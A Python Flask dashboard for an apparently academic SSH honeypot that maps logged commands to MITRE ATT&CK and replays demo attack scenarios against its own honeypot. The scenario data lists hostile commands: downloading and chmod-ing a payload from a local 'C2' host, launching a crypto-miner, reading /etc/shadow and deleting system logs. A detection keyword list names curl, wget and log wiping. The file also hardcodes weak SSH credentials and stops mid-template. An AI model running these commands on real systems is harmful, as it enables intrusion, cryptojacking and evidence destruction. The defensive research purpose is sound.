#!/usr/bin/env python3
"""
Adaptive Honeypot - Realtime Security Operations Center (SOC) Dashboard & Live Demo Tool.
- Giao diện trực quan thời gian thực theo dõi toàn bộ hoạt động của Honeypot.
- Tự động đồng bộ log từ máy ảo VMware (192.168.101.218:22) về Dashboard.
- Tích hợp công cụ phát động kịch bản tấn công trực tiếp (Live Attack Trigger) để demo.
- Phân tích và ánh xạ MITRE ATT&CK, đánh giá mức độ cảnh báo (HIGH, MEDIUM, LOW) theo chuẩn Machine Learning.
"""

import os
import sys
import json
import time
import uuid
import socket
import threading
from pathlib import Path
from typing import Dict, List, Any
import paramiko
from flask import Flask, jsonify, request, render_template_string

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

BASE_DIR = Path(__file__).resolve().parent
LOCAL_LOGS_DIR = BASE_DIR / "logs"
LOCAL_EVENTS_FILE = LOCAL_LOGS_DIR / "events.jsonl"
LOCAL_LOGS_DIR.mkdir(parents=True, exist_ok=True)

DATASET_5K_FILE = BASE_DIR / "data" / "raw" / "run-2026-11-06-train-5000" / "events.jsonl"

VM_HOST = "192.168.101.218"
VM_PORT = 22022
VM_USER = "nhuthang"
VM_PASS = "123"
REMOTE_LOG_FILE = "/home/nhuthang/adaptive-honeypot/logs/events.jsonl"

# Bảng ánh xạ MITRE ATT&CK độc lập phục vụ Alert Engine trên Dashboard
MITRE_MAPPING_RULES = [
    {"pattern": "whoami", "id": "T1033", "name": "System Owner/User Discovery", "tactic": "Discovery", "severity": "LOW"},
    {"pattern": "id", "id": "T1033", "name": "System Owner/User Discovery", "tactic": "Discovery", "severity": "LOW"},
    {"pattern": "uname", "id": "T1082", "name": "System Information Discovery", "tactic": "Discovery", "severity": "LOW"},
    {"pattern": "os-release", "id": "T1082", "name": "System Information Discovery", "tactic": "Discovery", "severity": "LOW"},
    {"pattern": "ps -ef", "id": "T1057", "name": "Process Discovery", "tactic": "Discovery", "severity": "LOW"},
    {"pattern": "ps aux", "id": "T1057", "name": "Process Discovery", "tactic": "Discovery", "severity": "LOW"},
    {"pattern": "ip a", "id": "T1016", "name": "System Network Configuration Discovery", "tactic": "Discovery", "severity": "LOW"},
    {"pattern": "netstat", "id": "T1016", "name": "System Network Configuration Discovery", "tactic": "Discovery", "severity": "LOW"},
    {"pattern": "ifconfig", "id": "T1016", "name": "System Network Configuration Discovery", "tactic": "Discovery", "severity": "LOW"},
    {"pattern": "cat /etc/passwd", "id": "T1087.001", "name": "Local Account Discovery", "tactic": "Discovery", "severity": "MEDIUM"},
    {"pattern": "sudo -l", "id": "T1548.003", "name": "Sudo and Sudo Caching", "tactic": "Privilege Escalation", "severity": "HIGH"},
    {"pattern": "sudo su", "id": "T1548.003", "name": "Sudo and Sudo Caching", "tactic": "Privilege Escalation", "severity": "HIGH"},
    {"pattern": "crontab", "id": "T1053.003", "name": "Scheduled Task/Job: Cron", "tactic": "Persistence", "severity": "HIGH"},
    {"pattern": "authorized_keys", "id": "T1098.004", "name": "SSH Authorized Keys", "tactic": "Persistence", "severity": "HIGH"},
    {"pattern": "curl", "id": "T1105", "name": "Ingress Tool Transfer", "tactic": "Command and Control", "severity": "HIGH"},
    {"pattern": "wget", "id": "T1105", "name": "Ingress Tool Transfer", "tactic": "Command and Control", "severity": "HIGH"},
    {"pattern": "xmr", "id": "T1496", "name": "Resource Hijacking (Cryptomining)", "tactic": "Impact", "severity": "CRITICAL"},
    {"pattern": "nohup", "id": "T1059.004", "name": "Command and Scripting: Unix Shell", "tactic": "Execution", "severity": "MEDIUM"},
    {"pattern": "history -c", "id": "T1070.003", "name": "Clear Command History", "tactic": "Defense Evasion", "severity": "HIGH"},
    {"pattern": "rm -f /var/log", "id": "T1070.002", "name": "Clear Linux System Logs", "tactic": "Defense Evasion", "severity": "CRITICAL"},
    {"pattern": "bash_history", "id": "T1070.003", "name": "Clear Command History", "tactic": "Defense Evasion", "severity": "HIGH"},
]

DEMO_SCENARIOS = {
    "discovery": {
        "title": "🔍 Trinh sát Hệ thống & Mạng (Discovery)",
        "scenario_id": "ssh-discovery-001",
        "user": "root",
        "pass": "123",
        "commands": ["whoami", "id", "uname -a", "cat /etc/os-release", "ps -ef", "ip a", "netstat -tuln"]
    },
    "bruteforce": {
        "title": "💥 Dò quét Mật khẩu SSH (Brute Force)",
        "scenario_id": "ssh-bruteforce-001",
        "failed_attempts": [("admin", "admin123"), ("root", "toor"), ("guest", "guest123"), ("support", "support2026")],
        "successful_login": ("root", "123"),
        "commands": ["whoami", "uname -a", "id"]
    },
    "privesc": {
        "title": "👑 Leo thang Đặc quyền (Privilege Escalation)",
        "scenario_id": "ssh-privilege-escalation-001",
        "user": "ubuntu",
        "pass": "123",
        "commands": ["id", "sudo -l", "sudo cat /etc/shadow", "sudo su", "whoami"]
    },
    "cryptomining": {
        "title": "⛏️ Khởi chạy Bot Đào Coin (Cryptomining)",
        "scenario_id": "ssh-mining-execution-001",
        "user": "root",
        "pass": "123",
        "commands": ["cd /tmp", "nohup ./xmr -o pool.minexmr.com:443 -u 48... --cpu-max-threads-hint=100 &", "ps aux | grep xmr", "top -b -n 1"]
    },
    "defense_evasion": {
        "title": "🧹 Xóa Dấu vết & Nhật ký (Defense Evasion)",
        "scenario_id": "ssh-defense-evasion-001",
        "user": "root",
        "pass": "123",
        "commands": ["cat /dev/null > ~/.bash_history", "history -c", "rm -f /var/log/auth.log", "rm -f /var/log/syslog"]
    },
    "malware_download": {
        "title": "📥 Tải Mã độc từ Máy chủ C2 (Ingress Tool)",
        "scenario_id": "ssh-malware-download-001",
        "user": "root",
        "pass": "123",
        "commands": ["cd /tmp", "curl -O http://192.168.1.50:8000/update.sh", "wget http://192.168.1.50:8000/xmr_miner -O .miner", "chmod +x update.sh .miner", "ls -la"]
    }
}

app = Flask(__name__)
events_cache: List[Dict[str, Any]] = []
cache_lock = threading.Lock()
last_read_offset = 0


def analyze_mitre_and_alert(event: Dict[str, Any]) -> Dict[str, Any]:
    """Ánh xạ tự động MITRE ATT&CK và tính mức cảnh báo cho event."""
    cmd = event.get("command", "")
    status = event.get("event_status", "")
    
    matches = []
    highest_severity = "LOW"
    
    if status == "login_failed" or "Auth_Failed" in status:
        matches.append({"id": "T1110.001", "name": "Brute Force: Password Guessing", "tactic": "Credential Access"})
        highest_severity = "MEDIUM"
        
    for r in MITRE_MAPPING_RULES:
        if r["pattern"] in cmd.lower():
            matches.append({"id": r["id"], "name": r["name"], "tactic": r["tactic"]})
            if r["severity"] == "CRITICAL":
                highest_severity = "CRITICAL"
            elif r["severity"] == "HIGH" and highest_severity != "CRITICAL":
                highest_severity = "HIGH"
            elif r["severity"] == "MEDIUM" and highest_severity not in ("CRITICAL", "HIGH"):
                highest_severity = "MEDIUM"

    event["mitre_matches"] = matches
    event["alert_level"] = highest_severity
    return event


def load_events_from_disk():
    """Nạp các sự kiện từ file local."""
    global events_cache
    if not LOCAL_EVENTS_FILE.exists():
        return
    try:
        new_events = []
        with open(LOCAL_EVENTS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line:
                    try:
                        ev = json.loads(line)
                        ev = analyze_mitre_and_alert(ev)
                        new_events.append(ev)
                    except Exception:
                        pass
        with cache_lock:
            events_cache = new_events
    except Exception as e:
        print(f"[!] Lỗi đọc file log local: {e}")


def vm_log_sync_worker():
    """Background worker liên tục tail log từ máy ảo VMware về Dashboard."""
    global events_cache
    while True:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(VM_HOST, port=VM_PORT, username=VM_USER, password=VM_PASS, timeout=5, look_for_keys=False, allow_agent=False)
            
            sftp = client.open_sftp()
            try:
                stat = sftp.stat(REMOTE_LOG_FILE)
                remote_size = stat.st_size
                
                local_size = LOCAL_EVENTS_FILE.stat().st_size if LOCAL_EVENTS_FILE.exists() else 0
                if remote_size > local_size:
                    with sftp.open(REMOTE_LOG_FILE, "r") as rf:
                        rf.seek(local_size)
                        new_data = rf.read().decode("utf-8", errors="ignore")
                        if new_data:
                            with open(LOCAL_EVENTS_FILE, "a", encoding="utf-8") as lf:
                                lf.write(new_data)
                            load_events_from_disk()
            finally:
                sftp.close()
                client.close()
        except Exception:
            pass
        time.sleep(2)


# Khởi chạy luồng đồng bộ log
sync_thread = threading.Thread(target=vm_log_sync_worker, daemon=True)
sync_thread.start()


@app.route("/")
def index():
    return render_template_string(DASHBOARD_HTML_TEMPLATE)


@app.route("/api/stats")
def get_stats():
    with cache_lock:
        total = len(events_cache)
        sessions = len(set(e.get("session_id", "") for e in events_cache if e.get("session_id")))
        ips = len(set(e.get("source_ip", "") for e in events_cache if e.get("source_ip")))
        
        alerts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        tactics_count: Dict[str, int] = {}
        
        for e in events_cache:
            lvl = e.get("alert_level", "LOW")
            alerts[lvl] = alerts.get(lvl, 0) + 1
            for m in e.get("mitre_matches", []):
                t = m.get("tactic", "Other")
                tactics_count[t] = tactics_count.get(t, 0) + 1
                
    return jsonify({
        "total_events": total,
        "total_sessions": sessions,
        "unique_ips": ips,
        "alerts": alerts,
        "tactics": tactics_count
    })


@app.route("/api/events")
def get_events():
    limit = int(request.args.get("limit", 100))
    search = request.args.get("search", "").lower()
    filter_status = request.args.get("status", "all")
    
    with cache_lock:
        filtered = []
        for e in reversed(events_cache):
            st = e.get("event_status", "").lower()
            if filter_status == "auth" and "auth" not in st and "login" not in st:
                continue
            if filter_status == "command" and "command" not in st and "interaction" not in st:
                continue
            if filter_status == "closed" and "closed" not in st:
                continue
                
            if search:
                cmd = str(e.get("command", "")).lower()
                ip = str(e.get("source_ip", "")).lower()
                user = str(e.get("username", "")).lower()
                sid = str(e.get("session_id", "")).lower()
                if search not in cmd and search not in ip and search not in user and search not in sid:
                    continue
                    
            filtered.append(e)
            if len(filtered) >= limit:
                break
                
    return jsonify(filtered)


@app.route("/api/session/<session_id>")
def get_session(session_id):
    with cache_lock:
        sess_events = [e for e in events_cache if e.get("session_id") == session_id]
    return jsonify({
        "session_id": session_id,
        "events": sess_events,
        "count": len(sess_events)
    })


@app.route("/api/trigger_attack", methods=["POST"])
def trigger_attack():
    data = request.json or {}
    sc_key = data.get("scenario", "discovery")
    if sc_key not in DEMO_SCENARIOS:
        return jsonify({"status": "error", "message": "Kịch bản không hợp lệ"}), 400
        
    sc = DEMO_SCENARIOS[sc_key]
    
    def run_attack_worker():
        target_host = VM_HOST
        target_port = 22  # Bắn vào Cổng 22 của Honeypot
        
        # 1. Nếu có failed attempts
        if "failed_attempts" in sc:
            for u, p in sc["failed_attempts"]:
                c = paramiko.SSHClient()
                c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    c.connect(target_host, port=target_port, username=u, password=p, timeout=5, allow_agent=False, look_for_keys=False)
                    c.close()
                except Exception:
                    pass
                time.sleep(0.3)
                
        # 2. Login thành công
        login_user = sc.get("user") or (sc["successful_login"][0] if "successful_login" in sc else "root")
        login_pass = sc.get("pass") or (sc["successful_login"][1] if "successful_login" in sc else "123")
        
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            c.connect(target_host, port=target_port, username=login_user, password=login_pass, timeout=10, allow_agent=False, look_for_keys=False)
            chan = c.invoke_shell()
            time.sleep(0.5)
            
            for cmd in sc.get("commands", []):
                chan.send(cmd + "\n")
                time.sleep(0.4)
                while chan.recv_ready():
                    chan.recv(2048)
                    
            chan.send("exit\n")
            time.sleep(0.3)
            chan.close()
            c.close()
        except Exception as e:
            print(f"[!] Lỗi phát động tấn công demo: {e}")
            
    threading.Thread(target=run_attack_worker, daemon=True).start()
    return jsonify({
        "status": "success",
        "message": f"Đang phát động kịch bản '{sc['title']}' vào Cổng 22...",
        "scenario": sc_key
    })


@app.route("/api/load_5k_dataset", methods=["POST"])
def load_5k_dataset():
    """Nạp bộ 5.145 log sự kiện thật từ dataset train vào Dashboard để biểu diễn."""
    global events_cache
    if not DATASET_5K_FILE.exists():
        return jsonify({"status": "error", "message": "Không tìm thấy file dataset 5k"}), 404
        
    try:
        loaded = []
        with open(DATASET_5K_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line:
                    ev = json.loads(line)
                    ev = analyze_mitre_and_alert(ev)
                    loaded.append(ev)
                    
        with cache_lock:
            events_cache = loaded
            
        return jsonify({
            "status": "success",
            "message": f"Đã nạp thành công {len(loaded)} sự kiện thực tế từ Dataset Train vào Dashboard!",
            "total_loaded": len(loaded)
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/clear_dashboard", methods=["POST"])
def clear_dashboard():
    global events_cache
    with cache_lock:
        events_cache = []
    # Truncate local file
    with open(LOCAL_EVENTS_FILE, "w", encoding="utf-8") as f:
        pass
    return jsonify({"status": "success", "message": "Đã làm sạch log trên Dashboard!"})


DASHBOARD_HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="vi" class="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Adaptive Honeypot - Realtime SOC Dashboard</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <script>
    tailwind.config = {
      darkMode: 'class',
      theme: {
        extend: {
          colors: {
            brand: { 500: '#38bdf8', 600: '#0284c7' },
            darkbg: '#0b1329',
            darkcard: '#151f38',
            darkborder: '#233258'
          }
        }
      }
    }
  </script>
  <style>
    body { background-color: #0b1329; color: #e2e8f0; font-family: system-ui, -apple-system, sans-serif; }
    .neon-border { box-shadow: 0 0 15px rgba(56, 189, 248, 0.2); }
    ::-webkit-scrollbar { width: 6px; height: 6px; }
    ::-webkit-scrollbar-track { background: #0b1329; }
    ::-webkit-scrollbar-thumb { background: #233258; border-radius: 4px; }
    ::-webkit-scrollbar-thumb:hover { background: #38bdf8; }
  </style>
</head>
<body class="p-4 lg:p-6 min-h-screen">

  <!-- TOP HEADER -->
  <header class="flex flex-col md:flex-row justify-between items-start md:items-center pb-4 mb-6 border-b border-darkborder gap-4">
    <div>
      <div class="flex items-center gap-3">
        <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-cyan-500 to-blue-600 flex items-center justify-center text-white shadow-lg shadow-cyan-500/30">
          <i class="fa-solid fa-shield-halved text-xl"></i>
        </div>
        <div>
          <h1 class="text-xl md:text-2xl font-bold bg-gradient-to-r from-cyan-400 via-blue-400 to-indigo-300 bg-clip-text text-transparent">
            ADAPTIVE HONEYPOT SOC DASHBOARD
          </h1>
          <p class="text-xs text-slate-400 flex items-center gap-2">
            <span class="inline-block w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
            Hệ thống Bẫy Cổng 22 đang trực tuyến (VM: 192.168.101.218:22) | Chuẩn Machine Learning JSON Lines
          </p>
        </div>
      </div>
    </div>

    <!-- QUICK ACTIONS -->
    <div class="flex flex-wrap items-center gap-2">
      <button onclick="load5kDataset()" class="px-3 py-2 bg-indigo-600/30 border border-indigo-500/50 hover:bg-indigo-600/50 text-indigo-200 text-xs font-semibold rounded-lg transition flex items-center gap-2">
        <i class="fa-solid fa-database"></i> Nạp 5.145 Log Dataset
      </button>
      <button onclick="clearDashboard()" class="px-3 py-2 bg-slate-800 border border-slate-700 hover:bg-slate-700 text-slate-300 text-xs font-semibold rounded-lg transition flex items-center gap-2">
        <i class="fa-solid fa-broom"></i> Xóa Màn hình
      </button>
      <div id="liveBadge" class="px-3 py-2 bg-emerald-950/60 border border-emerald-500/40 text-emerald-300 text-xs font-mono rounded-lg flex items-center gap-2">
        <i class="fa-solid fa-tower-broadcast animate-pulse"></i> LIVE SYNC
      </div>
    </div>
  </header>

  <!-- METRICS CARDS -->
  <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
    <div class="bg-darkcard border border-darkborder p-4 rounded-xl shadow-lg">
      <div class="flex justify-between items-center text-slate-400 text-xs mb-1">
        <span>TỔNG SỰ KIỆN LOG</span>
        <i class="fa-solid fa-list-check text-cyan-400"></i>
      </div>
      <div id="statTotalEvents" class="text-2xl font-bold text-white font-mono">0</div>
      <div class="text-[10px] text-cyan-400 mt-1">Định dạng JSON Lines chuẩn</div>
    </div>

    <div class="bg-darkcard border border-darkborder p-4 rounded-xl shadow-lg">
      <div class="flex justify-between items-center text-slate-400 text-xs mb-1">
        <span>SỐ PHIÊN TẤN CÔNG (SESSIONS)</span>
        <i class="fa-solid fa-network-wired text-blue-400"></i>
      </div>
      <div id="statTotalSessions" class="text-2xl font-bold text-white font-mono">0</div>
      <div class="text-[10px] text-blue-400 mt-1">Gom cụm qua session_id</div>
    </div>

    <div class="bg-darkcard border border-darkborder p-4 rounded-xl shadow-lg">
      <div class="flex justify-between items-center text-slate-400 text-xs mb-1">
        <span>IP TẤN CÔNG DUY NHẤT</span>
        <i class="fa-solid fa-location-crosshairs text-amber-400"></i>
      </div>
      <div id="statUniqueIps" class="text-2xl font-bold text-white font-mono">0</div>
      <div class="text-[10px] text-amber-400 mt-1">Nguồn phát tán mã độc</div>
    </div>

    <div class="bg-darkcard border border-darkborder p-4 rounded-xl shadow-lg">
      <div class="flex justify-between items-center text-slate-400 text-xs mb-1">
        <span>CẢNH BÁO MỨC CAO (HIGH/CRIT)</span>
        <i class="fa-solid fa-triangle-exclamation text-rose-400"></i>
      </div>
      <div id="statHighAlerts" class="text-2xl font-bold text-rose-400 font-mono">0</div>
      <div class="text-[10px] text-rose-400 mt-1">Trigger Alert Engine</div>
    </div>
  </div>

  <!-- CONTROL PANEL: LIVE ATTACK TRIGGER DEMO -->
  <div class="bg-gradient-to-r from-darkcard via-slate-900 to-darkcard border border-cyan-500/30 p-4 rounded-xl mb-6 shadow-xl neon-border">
    <div class="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
      <div>
        <h2 class="text-sm font-bold text-cyan-300 flex items-center gap-2">
          <i class="fa-solid fa-bolt-lightning text-amber-400"></i> CÔNG CỤ PHÁT ĐỘNG TẤN CÔNG TRỰC TIẾP VÀO CỔNG 22 (DEMO TOOL)
        </h2>
        <p class="text-xs text-slate-400 mt-0.5">
          Chọn kịch bản tấn công & bấm nút để kết nối socket SSH thật vào bẫy ảo, quan sát log nhảy theo thời gian thực!
        </p>
      </div>

      <div class="flex flex-wrap items-center gap-3 w-full md:w-auto">
        <select id="scenarioSelect" class="bg-slate-950 border border-slate-700 text-slate-200 text-xs rounded-lg px-3 py-2.5 outline-none focus:border-cyan-400 flex-1 md:flex-none">
          <option value="discovery">🔍 1. Trinh sát Hệ thống (Discovery - T1082, T1057)</option>
          <option value="bruteforce">💥 2. Dò quét Mật khẩu SSH (Brute Force - T1110)</option>
          <option value="privesc">👑 3. Leo thang Sudo Root (PrivEsc - T1548)</option>
          <option value="cryptomining">⛏️ 4. Khởi chạy Bot Đào Coin (Mining - T1496)</option>
          <option value="defense_evasion">🧹 5. Xóa Dấu vết Log & History (Evasion - T1070)</option>
          <option value="malware_download">📥 6. Tải Mã độc C2 qua Curl/Wget (Ingress - T1105)</option>
        </select>

        <button id="btnAttack" onclick="triggerLiveAttack()" class="px-5 py-2.5 bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-bold text-xs rounded-lg shadow-lg shadow-rose-600/30 transition flex items-center gap-2">
          <i class="fa-solid fa-play"></i> BẮN TẤN CÔNG THỰC TẾ
        </button>
      </div>
    </div>
  </div>

  <!-- MAIN SECTION: LIVE LOG STREAM -->
  <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">

    <!-- LOG TABLE (3 COLS) -->
    <div class="lg:col-span-3 bg-darkcard border border-darkborder rounded-xl p-4 shadow-xl flex flex-col h-[650px]">
      
      <!-- TOOLBAR -->
      <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center pb-3 mb-3 border-b border-darkborder gap-2">
        <div class="flex items-center gap-2">
          <span class="text-sm font-bold text-slate-200 flex items-center gap-2">
            <i class="fa-solid fa-terminal text-cyan-400"></i> DÒNG SỰ KIỆN THỜI GIAN THỰC (REALTIME STREAM)
          </span>
          <span id="eventCountBadge" class="px-2 py-0.5 bg-slate-800 text-slate-400 text-[10px] rounded-full font-mono">0 events</span>
        </div>

        <div class="flex items-center gap-2 w-full sm:w-auto">
          <!-- SEARCH -->
          <div class="relative flex-1 sm:w-48">
            <input type="text" id="searchInput" oninput="renderEventsTable()" placeholder="Tìm lệnh, IP, user..." class="w-full bg-slate-950 border border-slate-700 text-slate-200 text-xs rounded-lg pl-7 pr-2 py-1.5 outline-none focus:border-cyan-400">
            <i class="fa-solid fa-magnifying-glass text-[10px] text-slate-500 absolute left-2.5 top-2.5"></i>
          </div>

          <!-- FILTER STATUS -->
          <select id="statusFilter" onchange="renderEventsTable()" class="bg-slate-950 border border-slate-700 text-slate-300 text-xs rounded-lg px-2 py-1.5 outline-none focus:border-cyan-400">
            <option value="all">Tất cả</option>
            <option value="auth">Xác thực (Auth)</option>
            <option value="command">Lệnh (Command)</option>
            <option value="closed">Đóng phiên (Closed)</option>
          </select>
        </div>
      </div>

      <!-- TABLE CONTAINER -->
      <div class="flex-1 overflow-y-auto pr-1">
        <table class="w-full text-left text-xs">
          <thead class="sticky top-0 bg-slate-900/90 backdrop-blur border-b border-darkborder text-slate-400 uppercase text-[10px] tracking-wider z-10">
            <tr>
              <th class="py-2.5 px-3">Thời gian (UTC)</th>
              <th class="py-2.5 px-3">Trạng thái</th>
              <th class="py-2.5 px-3">Nguồn (IP:Port)</th>
              <th class="py-2.5 px-3">User</th>
              <th class="py-2.5 px-3">Lệnh & Output</th>
              <th class="py-2.5 px-3">MITRE ATT&CK</th>
              <th class="py-2.5 px-3">Cảnh báo</th>
              <th class="py-2.5 px-3 text-right">Chi tiết</th>
            </tr>
          </thead>
          <tbody id="eventsTbody" class="divide-y divide-darkborder/50 font-mono text-[11px]">
            <tr>
              <td colspan="8" class="text-center py-12 text-slate-500 font-sans">
                <i class="fa-solid fa-spinner fa-spin text-lg mb-2"></i><br/>Đang kết nối tới máy chủ Honeypot...
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>

    <!-- SIDE PANEL: MITRE RADAR & ANALYTICS (1 COL) -->
    <div class="space-y-6">
      
      <!-- MITRE TECHNIQUES DISTRIBUTION -->
      <div class="bg-darkcard border border-darkborder rounded-xl p-4 shadow-xl">
        <h3 class="text-xs font-bold text-slate-200 uppercase tracking-wider mb-3 flex items-center justify-between">
          <span>Chiến thuật MITRE ATT&CK</span>
          <i class="fa-solid fa-chart-pie text-cyan-400"></i>
        </h3>
        <div class="h-48 relative flex items-center justify-center">
          <canvas id="tacticsChart"></canvas>
        </div>
      </div>

      <!-- QUICK SESSION INSPECTOR -->
      <div class="bg-darkcard border border-darkborder rounded-xl p-4 shadow-xl">
        <h3 class="text-xs font-bold text-slate-200 uppercase tracking-wider mb-3 flex items-center justify-between">
          <span>Quy trình Học máy (ML)</span>
          <i class="fa-solid fa-brain text-purple-400"></i>
        </h3>
        <div class="space-y-2.5 text-xs text-slate-400 font-sans">
          <div class="p-2.5 bg-slate-900/60 rounded-lg border border-slate-800">
            <span class="text-cyan-400 font-bold block mb-0.5">1. Gom cụm Session</span>
            <span>Đợi sự kiện <code>session_closed</code> để đóng gói toàn bộ lệnh trong phiên.</span>
          </div>
          <div class="p-2.5 bg-slate-900/60 rounded-lg border border-slate-800">
            <span class="text-blue-400 font-bold block mb-0.5">2. Gán Ground Truth</span>
            <span>Đối chiếu với <code>scenario_manifest.json</code> độc lập, không dùng AI đoán.</span>
          </div>
          <div class="p-2.5 bg-slate-900/60 rounded-lg border border-slate-800">
            <span class="text-emerald-400 font-bold block mb-0.5">3. Huấn luyện & Đánh giá</span>
            <span>Chia tập 80/20 train mô hình phân loại tấn công đạt F1 > 0.95.</span>
          </div>
        </div>
      </div>

    </div>

  </div>

  <!-- SESSION MODAL -->
  <div id="sessionModal" class="fixed inset-0 bg-black/80 backdrop-blur-sm hidden z-50 flex items-center justify-center p-4">
    <div class="bg-darkcard border border-darkborder w-full max-w-3xl rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[85vh]">
      <div class="p-4 bg-slate-900 border-b border-darkborder flex justify-between items-center">
        <div class="flex items-center gap-2">
          <i class="fa-solid fa-folder-tree text-cyan-400"></i>
          <h3 id="modalSessionTitle" class="text-sm font-bold text-white font-mono">Session Details</h3>
        </div>
        <button onclick="closeModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
      </div>
      <div id="modalBody" class="p-4 overflow-y-auto space-y-3 font-mono text-xs flex-1">
        <!-- Dynamic timeline -->
      </div>
    </div>
  </div>

  <script>
    let rawEvents = [];
    let tacticsChart = null;

    // Khởi tạo Chart
    function initChart() {
      const ctx = document.getElementById('tacticsChart').getContext('2d');
      tacticsChart = new Chart(ctx, {
        type: 'doughnut',
        data: {
          labels: ['Discovery', 'Brute Force', 'PrivEsc', 'Mining', 'Defense Evasion'],
          datasets: [{
            data: [1, 1, 1, 1, 1],
            backgroundColor: ['#38bdf8', '#f59e0b', '#8b5cf6', '#ec4899', '#ef4444'],
            borderWidth: 0
          }]
        },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          plugins: {
            legend: { position: 'bottom', labels: { boxWidth: 10, color: '#94a3b8', font: { size: 10 } } }
          }
        }
      });
    }

    // Lấy dữ liệu thống kê
    async function fetchStats() {
      try {
        const res = await fetch('/api/stats');
        const data = await res.json();
        document.getElementById('statTotalEvents').innerText = data.total_events.toLocaleString();
        document.getElementById('statTotalSessions').innerText = data.total_sessions.toLocaleString();
        document.getElementById('statUniqueIps').innerText = data.unique_ips.toLocaleString();
        document.getElementById('statHighAlerts').innerText = (data.alerts.HIGH + data.alerts.CRITICAL).toLocaleString();

        // Cập nhật biểu đồ MITRE
        if (tacticsChart && data.tactics && Object.keys(data.tactics).length > 0) {
          tacticsChart.data.labels = Object.keys(data.tactics);
          tacticsChart.data.datasets[0].data = Object.values(data.tactics);
          tacticsChart.update();
        }
      } catch (e) {
        console.error(e);
      }
    }

    // Lấy danh sách events
    async function fetchEvents() {
      try {
        const res = await fetch('/api/events?limit=150');
        rawEvents = await res.json();
        document.getElementById('eventCountBadge').innerText = rawEvents.length + ' events';
        renderEventsTable();
      } catch (e) {
        console.error(e);
      }
    }

    // Vẽ bảng sự kiện
    function renderEventsTable() {
      const search = document.getElementById('searchInput').value.toLowerCase();
      const statusFilter = document.getElementById('statusFilter').value;
      const tbody = document.getElementById('eventsTbody');

      let filtered = rawEvents.filter(e => {
        const st = (e.event_status || '').toLowerCase();
        if (statusFilter === 'auth' && !st.includes('auth') && !st.includes('login')) return false;
        if (statusFilter === 'command' && !st.includes('command') && !st.includes('interaction')) return false;
        if (statusFilter === 'closed' && !st.includes('closed')) return false;

        if (search) {
          const cmd = (e.command || '').toLowerCase();
          const ip = (e.source_ip || '').toLowerCase();
          const u = (e.username || '').toLowerCase();
          const sid = (e.session_id || '').toLowerCase();
          if (!cmd.includes(search) && !ip.includes(search) && !u.includes(search) && !sid.includes(search)) return false;
        }
        return true;
      });

      if (filtered.length === 0) {
        tbody.innerHTML = `<tr><td colspan="8" class="text-center py-12 text-slate-500 font-sans">Chưa có sự kiện nào phù hợp.</td></tr>`;
        return;
      }

      tbody.innerHTML = filtered.map(e => {
        const ts = (e.timestamp || '').substring(11, 19);
        const st = e.event_status || 'event';
        const ip = e.source_ip || '-';
        const port = e.source_port || '-';
        const user = e.username || '-';
        const cmd = e.command || '';
        const out = e.command_output || '';
        const sid = e.session_id || '';
        const alertLvl = e.alert_level || 'LOW';

        // Badge Status
        let statusBadge = `<span class="px-2 py-0.5 rounded text-[10px] bg-slate-800 text-slate-300">${st}</span>`;
        if (st.includes('login_failed') || st.includes('Auth_Failed')) {
          statusBadge = `<span class="px-2 py-0.5 rounded text-[10px] bg-red-950/80 text-red-400 border border-red-800/50">DÒ SAI PASS</span>`;
        } else if (st.includes('login') || st.includes('Auth_Success')) {
          statusBadge = `<span class="px-2 py-0.5 rounded text-[10px] bg-emerald-950/80 text-emerald-400 border border-emerald-800/50">ĐĂNG NHẬP</span>`;
        } else if (st.includes('command') || st.includes('Interaction')) {
          statusBadge = `<span class="px-2 py-0.5 rounded text-[10px] bg-blue-950/80 text-blue-400 border border-blue-800/50">LỆNH</span>`;
        } else if (st.includes('closed') || st.includes('Closed')) {
          statusBadge = `<span class="px-2 py-0.5 rounded text-[10px] bg-purple-950/80 text-purple-400 border border-purple-800/50">ĐÓNG PHIÊN</span>`;
        }

        // Badge Alert
        let alertBadge = `<span class="text-slate-400 font-bold">LOW</span>`;
        if (alertLvl === 'CRITICAL') alertBadge = `<span class="px-1.5 py-0.5 rounded bg-red-500/20 text-red-400 font-bold border border-red-500/50">CRITICAL</span>`;
        else if (alertLvl === 'HIGH') alertBadge = `<span class="px-1.5 py-0.5 rounded bg-rose-500/20 text-rose-400 font-bold border border-rose-500/50">HIGH</span>`;
        else if (alertLvl === 'MEDIUM') alertBadge = `<span class="px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-400 font-bold border border-amber-500/50">MED</span>`;

        // MITRE tags
        let mitreTags = '<span class="text-slate-600">-</span>';
        if (e.mitre_matches && e.mitre_matches.length > 0) {
          mitreTags = e.mitre_matches.map(m => `<span class="inline-block px-1.5 py-0.5 rounded bg-cyan-950/80 text-cyan-300 border border-cyan-800/40 text-[9px] mr-1" title="${m.name}">${m.id}</span>`).join('');
        }

        return `
